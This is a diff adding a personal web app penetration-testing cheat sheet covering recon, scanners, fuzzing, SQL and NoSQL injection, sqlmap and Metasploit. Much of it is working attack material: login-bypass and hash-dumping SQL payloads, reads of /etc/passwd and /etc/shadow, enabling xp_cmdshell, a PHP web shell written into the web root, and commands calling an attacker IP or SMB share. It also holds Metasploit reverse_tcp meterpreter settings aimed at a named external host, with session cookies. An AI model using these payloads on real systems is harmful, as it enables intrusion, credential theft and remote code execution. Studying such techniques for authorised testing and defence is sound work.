@@ -1,0 +1,2982 @@
+
+Web App Pen Testing
+
+
+******************************************************************************************
+Recon Section
+******************************************************************************************
+
+httprint - fingerprints http servers
+	http://www.net-square.com/httprint/
+		Can be run in Wine under Linux
+		Output can be viewed in firefox in the httprintoutput.html file
+	httprint -h 192.208.27.4 -s /pentest/web/httprint/signatures.txt
+		httprint v0.301 (beta) - web server fingerprinting tool
+		(c) 2003-2005 net-square solutions pvt. ltd. - see readme.txt
+		http://net-square.com/httprint/
+		httprint@net-square.com
+
+		Finger Printing on http://192.208.27.4:80/
+		Finger Printing Completed on http://192.208.27.4:80/
+		--------------------------------------------------	
+		Host: 192.208.27.4
+		Derived Signature:
+
+		811C9DC5E2CE6922811C9DC5811C9DC5811C9DC5811C9DC5811C9DC5811C9DC5
+		811C9DC5970EE6BB811C9DC5811C9DC5811C9DC5811C9DC5811C9DC5811C9DC5		
+		E2CE6922E2CE6922E2CE6922811C9DC5E2CE6922811C9DC5E2CE6922811C9DC5
+		E2CE6922E2CE6922811C9DC5E2CE6922E2CE6922
+
+		Banner Reported: -
+		Banner Deduced: Linksys BEFSR41/BEFSR11/BEFSRU31
+		Score: 65
+		Confidence: 39.16		
+		------------------------
+		Scores:
+		Linksys BEFSR41/BEFSR11/BEFSRU31: 65 39.16
+		Ubicom/1.1: 56 24.51
+		Ubicom/1.1 802.11b: 56 24.51
+		MailEnable-HTTP/5.0: 55 23.15
+		Linksys AP1: 54 21.85	
+		Linksys Router: 52 19.39
+		Cisco-HTTP: 46 13.12
+		Cisco Pix 6.2: 46 13.12
+		Snap Appliances, Inc./3.x: 45 12.23
+		NetBuilderHTTPDv0.1: 43 10.57
+
+
+telnet 		Use telnet for Intelligence Gathering; force web server to return error message
+    telnet www.mysite.com 80
+	HEAD / HTTP/1.0
+    telnet www.mysite.com 80
+	GET /no_such_page_exists HTTP/1.0
+
+
+netcat
+	printf "GET / HTTP/1.0\n\n" |nc -v www.site.com 80
+			-w 3  -wait 3 seconds then drop if no connection
+	nc -v www.site.com 80
+	OPTIONS / HTTP/1.0
+
+	TRACE / HTTP/1.0
+	 HOST: anything.com
+	 X-Header: mytrace
+		# The HTTP TRACE method is designed for debugging and is enabled by default 
+		# on most Web Servers.  A trace request set from a browser to a web server
+		# will include all headers (e.g., cookies) that are valid for that web 
+		# server domain, and these cookies will appear in the "echo" that is 
+		# returned to the browser.  By doing the above if it gets "echoed" back
+		# to the browser than you know that TRACE is enabled
+
+	HEAD / HTTP/1.0
+
+	If OPTIONs returns support for PUT try:
+  	  nc -v www.site.com 80
+	  PUT /test HTTP/1.0	# /test is the name of the file to create
+	  this is a test	# this is the content to put in the file
+	  <CRLF>
+	  <CRLF>
+
+	DELETE /file.html HTTP/1.0
+	<CRLF>
+
+
+hmap		Tool for fingerpinting web servers
+		http://ujeni.murkyroc.com/hmap
+	/pentest/web/w3af/plugins/discovery/hmap.py -c 3 www.mysite.com:80
+		-c 3	limit the number of guesses
+
+dig -> domain transfer
+	dig -t AXFR site.org
+host -> domain transfer
+	host -la site.org
+
+Google GXFR - tool to dns zone transfer using google
+Manule zone transfer using google:
+	site:site.org -site:www.site.org
+	site:site.org -handlers
+
+Google Search:
+	intitle:"Index of" "Last Modified"
+	Narrow the search more with:
+		site:targetdomain.com
+
+Google Groups:
+	insubject: "Problems with my code"
+	author:kjohnson@sans.org	
+		must be a member of the group to search by author
+
+Social Network Parsing:
+	gpscan.rb 	-> search Google profiles
+			www.digininja.org/projects/gpscan.php
+			./gpscan.rb Microsoft
+
+	Named Reconnoiter	-> uses LinkedIn accounts from target 
+				   employees to generate potential login names
+				sourceforge.net/projects/reconnoiter/
+				./usernameGen.py InGuardians 10
+
+Bing Search engine:
+	ip:66.135.47.101
+	Will show you every site that Bing knows about on this IP
+
+Blind Elephant
+	./BlindElephant.py -l
+		List supported apps and plugins
+	./BlindElephant.py http://site.org/app guess
+		guess installed apps
+
+
+IIS-Tilde Enumeration - IIS-ShortName-Scanner:
+	https://github.com/irsdl/iis-shortname-scanner/
+	Needs Java 7
+		java -jar IIS-ShortName-Scanner.jar 2 20 http://site.com
+		java -jar IIS-ShortName-Scanner.jar 2 20 http://site.com/folder/
+
+
+******************************************************************************************
+Scanners and Proxies Section
+******************************************************************************************
+
+nikto	web site scanner
+	/pentest/scanners/nikto/nikto.pl -update
+	/pentest/scanners/nikto/nikto.pl -host www.mysite.com -C all
+		-id   this flag allows you to pass "basic" authentication credentials
+		To get nikto to run within Nessus it must be in the path before the nessus 
+		daemon starts up.  
+		export PATH=$PATH:/usr/local/nikto:/pentest/scanners/nikto && nessusd -D
+	nikto.pl -host 192.168.1.100 -root /~user mutate 1
+		-root /~user 	--tells nikto to use that directory as the root directory
+		mutate 1	--tells nikto to guess additional file names
+	nikto.pl -host www.site.org -C all -Format HTM -output nikto.html
+		Creates HTML report of scan 
+	nikto.pl -C all -mutate 1 -Plugins @@ALL -host www.mysite.com
+		-C all		Scan all CGI Directories
+		-mutate 1	Combine tests - Tests all files with all root directories
+		-Plugins @@ALL	Select which plugins will be run
+		-host		host to scan
+	./nikto.pl -host www.site.org -Format HTM -output nikto.html
+
+nikto
+   -T	Test Categories
+		0	File Upload
+		1	Interesting File / Seen in logs
+		2	Misconfiguration / Default file
+		3	Information Disclosure
+		4	Injection (XSS/Script/HTML)
+		5	Remote File Retrieval, in web server root directory
+		6	Denial of Service, without launching DoS attack
+		7	Remote File Retrieval - Server Wide
+		8	Command Execution / Remote Shell
+		9	SQL Injection
+		a	Authentication Bypass
+		b	Software Identification
+		x	Reverse Tuning Options
+
+	./nikto.pl -h 1.1.1.1 -T 48
+		This would look for web resources on 1.1.1.1 that had flaws
+		associated with (4) Injection and (8) Command Execution
+
+	./nikto.pl -Single
+		This allows you to compose and HTTP request manually and send
+		it to a target and view the response coming back.  XSS, If the 
+		exact same response, compared to the request, comes back it is 
+		vulnerable to XSS
+
+	Integrate Nikto with Nessus:
+		http://blog.tenablesecurity.com/2008/09/using-nessus-to.html
+
+
+DirBuster	- designed to brute force directories and files names on web/application 
+		  servers. Often is the case now of what looks like a web server in a state of 
+		  default installation is actually not, and has pages and applications hidden 
+		  within. DirBuster attempts to find these.  You must select a "dir list" file
+		    directory-list-2.3-small.txt - (87650 words) - Directories/files that 
+			where found on at least 3 different hosts
+		    directory-list-2.3-medium.txt - (220546 words) - Directories/files that 
+			where found on at least 2 different hosts
+		    directory-list-2.3-big.txt - (1273819 words) - All directories/files that 
+			where found
+		    directory-list-lowercase-2.3-small.txt - (81629 words) - Case insensitive 
+			version of directory-list-2.3-small.txt
+		    directory-list-lowercase-2.3-medium.txt - (207629 words) - Case 
+			insensitive version of directory-list-2.3-medium.txt
+		    directory-list-lowercase-2.3-big.txt - (1185240 words) - Case insensitive 
+			version of directory-list-2.3-big.txt
+		    directory-list-1.0.txt - (141694 words) - Original unordered list 
+		    apache-user-enum-1.0.txt - (8916 usernames) - Used for guessing system 
+			users on apache with the userdir module enabled, based on a username 
+			list I had lying around (unordered)
+		    apache-user-enum-2.0.txt - (10341 usernames) - Used for guessing system 
+			users on apache with the userdir module enabled, based on ~XXXXX 
+			found during list generation (Ordered)
+
+
+
+nice little setup for "middling" https-based thick clients that don't support proxy controls.
+	Here's the basic recipe:
+		1.) You've got a thick client app that you think runs an HTTPS backend communications
+		  channel, but it doesn't support proxy options, but you want to get inside the tunnel 
+		  to see what it's doing
+		2.) Invoke Burp Suite with sudo rights (you need sudo to bind to reserved ports if 
+		  the app runs in that range)
+		3.) Go to Proxy => Options => Proxy Listeners => Add
+		4.) On the binding tab, set your bind port to whatever the client connects over (443 
+		  is pretty common)
+		5.) On the request handling tab, set your redirect host to the server side IP and Port 
+		  the client connects to
+		6.) Check force use of SSL and Check support for invisible proxying
+		7.) Go to the thick client interface and point to 127.0.0.1
+		8.) Sit back and watch all the cool paths you never knew about the server application, 
+		  fuzz away and find some new vulns
+
+
+
+spidering with wget:
+	wget -e robots=off -r http://www.site.org --no-check-certificate
+		turns off robots.txt restrictions
+
+	wget -r http://site.org --no-check-certificate
+		Scrape all content from the downloaded web files and create a dictionary file used to
+			attack logins on the web site.  cat *.html |sort |uniq > dictionary.txt
+			also see cewl
+
+	wget -k -p -nH -N http://www.site.org
+		clone website locally
+		-k  converts any links found within the downloaded files to refer to local copies
+		    not relying on the original or online content
+		-p  Downloads any prerequisite files such that the page can be displayed locally 
+		    without online connectivity.  This includes images and style sheets
+		-nH Disables download of files into host-prefixed named folders
+		-N  Enables time-stamping of files to match the source timestamps
+
+	wget http://bit.ly/23a3ajh --trust-server-names 
+		uses the actual file name instead of the shorted URL for saving the file to disc
+
+Ratproxy	->passive scanner
+		http://code.google.com/p/ratproxy
+		Can decompile flash objects
+		./ratproxy -w rat.log -v rat -d www.site.org -xtfscgjX
+		./ratproxy-report.sh rat.log > rat.html
+			-w write rat.log
+			-v use directory rat
+			-d specified domain only (default is all)
+			-x log all XSS candidates
+			-t log all directory traversal candidates
+			-f log all Flash applications for analysis
+			-s log all POST requests for analysis
+			-c log all cookie setting URLs for analysis
+			-g perform XSRF token checks on all GET requests
+			-j report on risky Javascript constructions
+			-X disruptively validate XSRF, XSS protections
+			-P use upstream proxy (-P host:port)
+
+
+******************************************************************************************
+Fuzzers Section
+******************************************************************************************
+jbrofuzz	- it allows for the identification of certain classess of security 
+		  vulnerabilities, by means of creating malformed data and having the 
+		  server/service in question consume the data. 
+		  For web pentesting click the web directories tab and add any directories to
+			test to the "Total Directories to test:" list.  Click Start
+
+After fuzzing - look for HTTP 500 status codes and use these for exploitation!
+
+
+FuzzDB -> db of fuzzable attack strings
+	http://code.google.com/p/fuzzdb
+
+Big list of Naughty Strings:
+	https://github.com/minimaxir/big-list-of-naughty-strings
+
+
+
+
+
+
+******************************************************************************************
+SQL injection Section
+******************************************************************************************
+
+SQL Injection:
+	SQL Injection Characters:
+		' or " 		Character String Indicators
+		-- or #		Single line Comment
+		/*...*/		Multi-line Comment
+		+		Addition, concatenate (or space in a url)
+		-		subtracation
+		=		Equality operator
+		<>!=		Inequality operators
+		><		Greater than and less than operators
+		()		Expression or hierarchy delimitor
+		||		(double pip) concatenate in Oracle and Postgres
+		%		wildcard attribute indicator
+		,		list item separator
+		@, @@		Local and Global variable indicators
+		.		Identifer qualifer seperator
+		PRINT		Useful as non transactional command
+		@variable	Local Variable
+		@@variable	Global Variable
+		waitfor delay '0:0:10'	time delay
+		'IF USER='dbo' %20waitfor%20delay'0%3a0%3a20'--
+
+		; IF (ASCII(lower(substring((USER),1,1)))>97) WAITFOR DELAY '00:00:10'-- (+10 seconds)
+
+	Difference between Databases:
+			MS Sql		MySQL		Access		Oracle		Postgres
+	Concatenate	''+''		concat		""&""		''||''		''||''
+	strings				("","")
+	
+	Null		isnull()	ifnull()	iff(isnull())	ifnull()	COALESCE()
+	replace
+
+	Position	CHARINDEX	LOCATE()	InStr()		InStr()		TEXTPOS()
+
+	Op Sys		xp_cmdshell	select into	#date#		utf_file	Call
+	Interaction			outfile /
+					dumpfile
+
+	Cast		Yes		No		No		No		Yes
+
+	Union		Yes		Yes		Yes		Yes		Yes
+
+	Subselects	Yes		Yes 4.1+	No		Yes		Yes
+
+	Batch Queries	Yes		No		No		No		Yes
+
+	Default Stored	Yes		No		No		Yes		No
+	Procedures
+
+	Linking DBs	Yes		Yes		No		Yes		No
+
+
+	Finding out User Privilege Level:
+		user
+		current_user
+		session_user
+		system_user
+
+		' and 1=user --
+		'; if user ='dbo' waitfor delay '0:0:5' --
+		' union select if ( user() like 'root@%', benchmark(50000,sha1('test')),'false');
+
+	Retrieving a Password Hash:
+		Oracle:	`union all select 1,1,username,password from dba_users where `'=`
+
+		MySQL:	`union all select User,Password,'text','text' from mysql.user where `'=`
+
+		MSSQL:	`union all select name,password,`text',1 from syslogins where `'=`
+			`union all select name,password,`text',1 from sysxlogins where `'=`
+
+		Read/Write Local files Using SQL Injection:
+			MySQL:	' union select load_file('/etc/passwd'),1 #
+
+			MSSQL:	BULK INSERT temp FROM 'C:\test' --
+	
+			Oracle:	UTL_
+
+
+	Example MSSQL injection with OS Interacation:
+		'; exec master.xp_cmdshell 'netstat -an > temp.txt' --
+		'; CREATE TABLE tmp (txt varchar(8000));
+		   BULK INSERT tmp FROM 'temp.txt'
+		      with (rowterminator = "\n\n\n\n")--
+		'and 1 in (select txt from tmp) --
+		'; drop table tmp--
+
+
+	Example SQL Injection:
+	    30000' select name from sysobjects--
+	    30000' select name from syscolumns--
+	    30000' exec sp_makewebtask '
+	    30000' ; exec xp_cmdshell --
+	    30000' having 1=1--
+
+	SQL Injection cheat sheet:
+		http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/
+
+	Errors:
+		Oracle	-Always starts with ORA-0xxx"
+		MS SQL	-Incorrect Syntax near `
+		MySQL	-You have an error in your SQL syntax
+
+	Standard SQL Commands:
+	   Select to retrieve records:
+		select chrName, chrPhone from tblUsers;
+	   insert to add records to a database:
+		insert into "tblUsers" (chrName, chrPhone) values ("jim", "303");
+	   update to modify existing records:
+		update <tablename> set <columnname> = "<newdata>" where <columnname> = <value>;
+		update tblUsers set chrPhone = "303-123-4567" where chrName = "Kevin";
+	   To update multiple columns:
+		update <tablename> set <columnname> = "<newdata>", <columnname> = "<newdata>" where <columnname> = <value>;
+		update tblUsers set chrPhone = "303-123-4567", charity = "Tulsa" where chrNmae = "Kevin";
+
+	SELECT		-Query the data and return the results
+			 SELECT * FROM table INTO dumpfile '/result.txt';
+	CREATE		-Create some db object liek a record, tables, stored-
+			 procedures, etc...
+	UPDATE		-Update an existing database object (such as a record)
+	DROP		-Delete data (drop user_table;)
+	SHUTDOWN	-stop the server
+	AND		-logical joining of two part of a query
+	OR		-logical joining of two parts of a query
+	UNION		-join the results of two queries (number of fields must
+			 be equal
+			 ' union select load_file ('/etc/shadow'),1 #
+	INSERT		-Insert Data into DB
+			 You don't know the db schema so you need to guess the
+			 number of fields:
+				foo');--
+				foo',1)--
+				foo',1,1);--
+	;		-finish the sql statment - and possibly start another 
+				; shutdown;--
+	--		-comment delimiter for some databases (not all).  Often
+			 used to "get rid of the rest of a canned SQL query...
+	IF		-conditional statement - helpful in blind SQL injection
+	SUBSTRING	-Select a part of the string - helpful in blind SQL
+			 injections	
+	WAITFOR		-Cause a time delay
+
+	' or ''='' or''='		#SQL Injection for Login and Password field
+	' or '1=1''			#Put in both the login and Password field
+	1<2 and "Brenna"="Brenna"	#other injections that are always true
+
+
+
+	%09 (which is a tab or ht) can be used instead of spaces if spaces are 
+		filtered when writing injection string
+
+	Also, try eleminating spaces:
+		admin'or'1'='1#			use # instead of --
+
+
+
+	Useful SQL Elements that indicate a comment:
+		--
+		#
+		/* 
+	Values of OR TRUE:
+		' or 1=1
+		" or 1=1
+		' or 'a' = 'a
+		') or ('a'=a
+	select * from inventory where sku='' or 1=1--';
+
+	[o] show rows starting with this offset
+	[r] rows of output to display
+	MySQL	WHERE id = 0 UNION SELECT 'data' LIME [o], [r]
+	MSSQL	WHERE id = 0 UNION SELECT 'TOP [r] 'data' WHERE
+			data_column NOT in (SELECT TOP [o] 'data')
+
+
+	Additional SQL Elements
+	;	support for multiple queries...just like bash
+
+	Union	take the results of two searches and merge them in to one set
+		of results.  
+		select * from inventory where sku='' UNION select * from users
+			where 1=1;--';
+		
+		select * from inventory where sku='' UNION select (name, id, 1
+			, 1, 1) from users where 1=1;--';
+
+		UNION select statments must have the same number of columns or
+			they will error out.  by using a *,1 we can pad columns
+			so that they end up matching
+			" union select *,1 from accounts /*
+
+	MS SQL
+		select name from master..sysobjects where xtype ='U';
+		select top 1 table_name from information_schema.tables;
+
+		 WAITFOR DELAY '0:0:10'--
+			 ProductID=1;waitfor delay '0:0:10'--
+			 ProductID=1);waitfor delay '0:0:10'--
+			 ProductID=1';waitfor delay '0:0:10'--
+			 ProductID=1');waitfor delay '0:0:10'--
+			 ProductID=1));waitfor delay '0:0:10'--
+			 'IF USER='dbo' %20waitfor%20delay'0%3a0%3a20'--
+
+		category=W’or(substring((select @@version),1,1))='m
+
+		Get SQL Version:
+		category=W%27or%28select%20@@version%29like%27%252008%25
+		category=W'or(select @@version)like'%2008%
+
+		Get User:
+		'category=W’or(select user)='sa
+		'category=W’or(select user)='dbo
+		
+		Get host name of server.  Run through ‘cluster bomb’ in burp. The first §1§ and §a§ for positions
+		'or(substring((select%20host_name()),1,1))%3D’a
+		
+		Get database name.  Run through ‘cluster bomb’ in burp. The first §1§ and §a§ for positions
+		'or(substring((select%20db_name()),1,1))%3D'a
+
+
+		OS Interaction via SQL injection on MS SQL
+		'; exec master.xp_cmdshell 'route print > results.txt' --
+		'; Create TABLE results (outp varchar(5000)); --
+		'; BULK INSERT results FROM 'results.txt' with (rowterminator= "\n\n\n\n"); --
+		' and 1 in (select outp from results) --
+
+		Enable xp_cmdshell if it is disabled
+			EXEC sp_configure 'show advanced options', 1;
+			RECONFIGURE;
+			EXEC sp_configure 'xp_cmdshell', 1;
+			RECONFIGURE;
+	
+			Enable:
+			';EXEC sp_configure 'show advanced options', 1--
+			';RECONFIGURE--
+			';EXEC sp_configure 'xp_cmdshell', 1--
+			';RECONFIGURE--
+
+			Disable:
+			';EXEC sp_configure 'show advanced options', 1--
+			';RECONFIGURE--
+			';EXEC sp_configure 'xp_cmdshell', 0--
+			';RECONFIGURE--
+
+
+	Oracle
+		select table_name from user_tables;
+	
+	MySQL
+		select table_schema,table_na,e from infromation_schema.tables;
+
+SQL Injection Cheat Sheet
+	http://pentestmonkey.net
+
+Mavi Tuna -> good sql injectin cheat sheet
+
+Havij -> windows based SQL injection tool
+		http://itsecteam.com/en/projects/project1.htm
+
+
+SQL Injection to perform Command Injection
+	MS SQL
+		exec master..xp_cmdshell 'ping [attackerIP]' --
+
+		exec master..sp_makewebtask \\[attackerIP]\share\results.html, "
+			select * from information_schema.tables"
+
+	MySQL
+		and 1=0 union select '[PHP code]' INTO OUTFILE 
+			'/var/www/html/mycode.php'
+
+Guessing letters in the table name via Blind SQL Injection
+	and substring((select top 1 name from master..sysobjects where xtype='
+		U'),1,1)>'m'
+			This asks if the first letter is m, keep trying until
+			you get the correct letter.
+			Then change to 2,1 and try again to get the 2nd letter
+			then change to 3,1 and try again, etc, etc
+
+Example SQL Injection on a PHP site with MySQL backend:
+	"
+	" or 1=1 /*		We learned that there are 6 colums
+	" union select * from accounts /*
+	" union select *,1 from accounts /*	We pad with 1's until we get 6
+	" union select "hello world", "", "", "", "", "" /*
+	" union select "<?php system(\"ping -c 4 1.1.1.1\");", "", "", "", "",
+		"" into outfile "/var/www/html/haxor.php" /*
+			This creates a file that you can access on the website
+			that will ping your IP 1.1.1.1; http://site/haxor.php
+	" union select "<?php if (isset($_REQUEST['cmd'])){ echo '<pre>'; system($_REQUEST['cmd']); echo '</pre>'; } ?><form action=<?php echo basename($_SERVER['PHP_SELF'])?>> <input type=text name=cmd size=20> <input type=submit></form>","","","","","" into outfile "/var/www/html/haxor2.php" /*
+		This is a command injection page that will let you execute any
+			command you want.  Access http://site/haxor2.php
+
+
+	
+Blind SQL Injection Examples:
+		index.php?itemid=9	Returns data about a specific item #9
+		index.php?itemid='	Returns no item found message
+		index.php?itemid=9' and 1=1; --	  Returns data about item #9
+		index.php?itemid=9' and 1=0; --   Returns a no item found message
+
+Absinthe	Blind and Normal SQL injection tool
+
+
+Fingerprinting the Database:
+	Master database adn schema tables:
+		MS SQL 		-> select name from master..sysobjects where xtype = 'U';
+		Oracle		-> select tables_name from user_tables;
+		PostgreSQL	-> select relname from pg_class;
+		MySQL		-> select Select_priv from mysql.dlb;
+
+	MySQL -> ' union select load_file('/etc/shadow'),1 #
+		select * from table into outfile '/result';
+		
+	MSSQL -> BULK INSERT table FROM 'c:\boot.ini' --
+
+	PostGRES -> COPY mydata FROM '/etc/passwd';
+		    COPY mydata TO '/tmp/data';
+
+	OS Interaction in 4 commands:
+		'; exec master.xp_cmdshell 'route print > results.txt' --
+		'; create TABLE results (outp varchar(5000)); --
+		'; BULK INSERT results FROM 'results.txt' with (rowterminator= "\n\n\n\n"); --
+		'; and 1 in (select outp from results) --
+
+SQL Injection examples:
+	'%2bbenchmark(20000000%2csha1(1))%2b'
+	%20and%20benchmark(20000000%2csha1(1))--%20
+	%20or%202371%3d2371
+
+	SELECT * FROM users WHERE username='[username]' and password='[password]'
+		if you inject a \ in the username field it will escape the second ' around 
+		username.  This will make the username field actually be:
+			' and password=
+		now in the password field enter:
+			or 1=1 #
+
+	
+
+
+SQLMap	Tool for Blind and Normal SQL injection.  Will provide an OS
+	Shell.  It is a part of w3af
+	http://sqlmap.sourceforge.net
+	./sqlmap.py -u http://site.org/sqli.php?name=Kevin
+	./sqlmap.py -u http://site.org/sqli.php?name=Kevin --users
+	./sqlmap.py -u http://site.org/sqli.php?name=Kevin --current-user
+	./sqlmap.py -u http://site.org/sqli.php?name=Kevin —-privileges
+	./sqlmap.py -u http://site.org/sqli.php?name=Kevin —-roles
+	./sqlmap.py -u http://site.org/sqli.php?name=Kevin --current-db
+	./sqlmap.py -u http://site.org/sqli.php?name=Kevin --tables
+	./sqlmap.py -u http://site.org/sqli.php?name=Kevin --columns
+	./sqlmap.py -u http://site.org/sqli.php?name=Kevin --schema
+	./sqlmap.py -u http://site.org/sqli.php?name=Kevin --passwords
+	./sqlmap.py -u http://site.org/sqli.php?name=Kevin --comments #retrieve DBMS comments
+	./sqlmap.py -u http://site.org/sqli.php?name=Kevin --is-dba
+	./sqlmap.py -u http://site.org/sqli.php?name=Kevin --file-read=/etc/hosts
+	./sqlmap.py -u http://site.org/sqli.php?name=Kevin --sql-shell
+	./sqlmap.py -u http://site.org/sqli.php?name=Kevin --os-shell
+	./sqlmap.py -u http://site.org/sqli.php?name=Kevin --os-cmd=<OS Command> 
+	./sqlmap.py -u http://site.org/sqli.php?name=Kevin --os-pwn --msf-path /framework3      #meterpreter 
+	./sqlmap.py -u http://site.org/sqli.php?name=Kevin --priv-esc    #privilege escalation
+
+
+	./sqlmap.py -u "http://<site>" --data="username=1&password=2"	./sqlmap.py -u "http://<site>" --data="username=1&password=2” --dbs	./sqlmap.py -u "http://<site>" --data="username=1&password=2" -D stuff --tables	./sqlmap.py -u "http://<site>" --data="username=1&password=2" -D stuff –T items --dump		stuff is the DB name
+		items is the Table name
+
+	Tamper Scripts:
+		MSSQL 
+--tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,percentage,randomcase,sp_password,space2comment,space2dash,space2mssqlblank,space2plus,space2randomblank,unionalltounion,unmagicquotes
+
+		MYSQL 
+--tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,randomcase,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
+
+		General 
+--tamper=base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,percentage,randomcase,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
+
+		Oracle
+--tamper=between,charencode,equaltolike,greatest,multiplespaces,randomcase,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes,xforwardedfor
+
+
+	Basic support for REST-style URL parameters by using the asterisk (*) to mark where to 
+	test for and exploit SQL injection
+	./sqlmap.py -u "http://site.com/param1/param2/param3*/param4
+		sqlmap will test injection points at the *
+	./sqlmap.py --dump-all -g "site:site.org ext:php"
+		dumps all information from google about the web site with php pages
+		then attempts to sql inject the parameters
+
+	./sqlmap.py -u http://site.org/index.php?param= --method="POST" --dbms=mysql --dump-all --level=5 --risk=3 --data=blablalba --cookie="blablabl"
+		-u URL
+		--data 		data string to be sent through POST
+		--cookie	HTTP cookie header
+		--level=5 	Level of tests to perform (1-5, default 1)
+		--risk=3	Risk of tests to perform (1-3, default 1)
+		--dump-all	Dump all DBMS database tables entries 
+		--dump <db name> Dump Database by name
+		--method="POST"	use POST method
+
+	./sqlmap.py -u http://192.168.0.103/HacmeBank_v2_Website/aspx/login.aspx --dump-all --level=5 --risk=3 --data="__VIEWSTATE=dDwtarPj9BldRpGQdExe&txtUserName=&txtPassword=&btnSubmit=Submit"	
+
+	SQLmap -> can take logs from burp
+		./sqlmap.py -l /tmp/burp.log --scope="site.org"
+		--prefix="')"	-> tell burp all queries begin with this
+		--suffix=" AND ('a'='a"
+		--technique=BT
+			Default: BEUST
+			B boolean
+			E error
+			U union
+			S stacked query
+			T timing
+		--replicate	-> replicates db in sqlite3
+		--dump
+		-T <table> 	-> dump table by name
+		-C <column name> 
+		--level=5
+		--risk=3
+		--flush-session	  -> flush stored data from existing scans
+		--string="<text>" -> indicates to sqlmap a valid query
+
+		--check-payload  ->helps bypass WAF
+
+	--check-waf	 ->looks at responses to see if blocking is occuring
+	Tamper Scripts
+		/opt/samurai/sqlmap/tamper/
+		apostrophemask.py
+		space2plus.py
+		etc
+	--tamper tamper/randomcomments.py
+	--tables -> lists tables in the DB
+	can crack mysql hashed passwords
+
+	burp suite plugin:
+		http://blog.buguroo.com/?p=2471&lang=en
+		Right click and say 'send to sqlmap' within burp
+
+
+DB2 Load file:
+	create table ldtest (t varchar(2000))
+	load from /etc/passwd of del insert into ldtest
+	select * from ldtest
+
+******************************************************************************************
+NoSQL Injection Section
+******************************************************************************************
+
+NoSQLMap	SQLMap for NoSQL databases:
+		http://www.nosqlmap.net
+
+
+MongoDB Injection
+	|| 1==1		translates to the SQL or 1=1 always true syntax
+	// or <!--	use to comment out the end of a query
+
+	Login name field might look something like:
+
+		admin' || 1==1%00'
+		  or encoded version:
+		admin%27%20||%201==1%00%27
+			Browser will mess up encoding big time. Need to do in repeater
+
+
+
+
+NoSQL injection Cheat Sheet
+	db.getName() – Get current DB name
+	db.members.count() – Get number of documents in the collection
+	db.members.validate({ full : true}) – Get ALL information about this 
+		collection
+	db.members.stats() – Get information about this collection
+	db.members.remove() – remove all documents from current collection 	
+	db.members.find().skip(0).limit(1) – Get documents from DB (Change only 
+		number in skip() function)
+	db.getMongo().getDBNames().toString() – Get the list of all DBs
+	db.members.find()[0][‘pass’] – Get “pass” value from current collection
+
+
+SQL Injection Metasploit Links:
+	https://www.netspi.com/DesktopModules/SunBlog/Handlers/Print.aspx?id=139
+	https://www.secforce.com/blog/2011/01/penetration-testing-sql-injection-and-metasploit/
+	http://www.darkoperator.com/blog/2009/11/27/attacking-mssql-with-metasploit.html
+	https://www.offensive-security.com/metasploit-unleashed/scanner-mssql-auxiliary-modules/
+
+SQL Injection with SMB Relaying via Metasploit:
+	See above links for reference
+
+Module options (exploit/windows/smb/smb_relay):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SHARE    tcz              yes       The share to connect to
+   SMBHOST  216.54.248.21    no        The target SMB server (leave empty for originating system)
+   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT  445              yes       The local port to listen on.
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: , , seh, thread, process, none)
+   LHOST     216.54.248.21    yes       The listen address
+   LPORT     4444             yes       The listen port
+
+
+exploit
+jobs
+
+
+
+Module options (auxiliary/admin/mssql/mssql_ntlm_stealer_sqli):
+
+   Name      Current Setting                                                                                                                                                        Required  Description
+   ----      ---------------                                                                                                                                                        --------  -----------
+   COOKIE    ASPSESSIONIDQQTCQQBT=ABAOFKMDCAAPOPIANIJCNKFC                            no        Cookie value
+   DATA                                                                                                                                                                             no        POST data, if necessary, with [SQLi] indicating the injection
+   GET_PATH  /indices/data/DataOutputExcel.xls?queryID=DWIndexHistory&isd_index=i2031010503&app=excel[SQLi]&lapses=EOM&Date=01.06.2015&Fixing=EU_EOD&to=01.06.2015&from=02.05.2015  yes       The complete path with [SQLi] indicating the injection
+   METHOD    GET                                                                                                                                                                    yes       GET or POST
+   Proxies                                                                                                                                                                          no        Use a proxy chain
+   RHOST     productsuat.markit.com                                                                                                                                                 yes       The target address
+   RPORT     443                                                                                                                                                                    yes       The target port
+   SMBPROXY  216.54.248.21                                                                                                                                                          yes       IP of SMB proxy or sniffer.
+   VHOST                             
+
+*****************************************************
+
+
+Module options (exploit/windows/mssql/mssql_payload_sqli):
+
+   Name      Current Setting                                                                                                                                                        Required  Description
+   ----      ---------------                                                                                                                                                        --------  -----------
+   COOKIE    ASPSESSIONIDQQTCQQBT=ABAOFKMDCAAPOPIANIJCNKFC                            no        Cookie value
+   DATA                                                                                                                                                                             no        POST data, if necessary, with [SQLi] indicating the injection
+   DELIVERY  OLD                                                                                                                                                                    yes       Payload delivery method (Accepted: PS, CMD, OLD)
+   GET_PATH  /indices/data/DataOutputExcel.xls?queryID=DWIndexHistory&isd_index=i2031010503&app=excel[SQLi]&lapses=EOM&Date=01.06.2015&Fixing=EU_EOD&to=01.06.2015&from=02.05.2015  yes       The complete path with [SQLi] indicating the injection
+   METHOD    GET                                                                                                                                                                    yes       GET or POST
+   Proxies                                                                                                                                                                          no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOST     productsuat.markit.com                                                                                                                                                 yes       The target address
+   RPORT     443                                                                                                                                                                    yes       The target port
+   VHOST                                                                                                                                                                            no        HTTP server virtual host
+
+
+Payload options (windows/patchupmeterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: , , seh, thread, process, none)
+   LHOST                      yes       The listen address
+   LPORT     4444             yes       The listen port
+
+
+
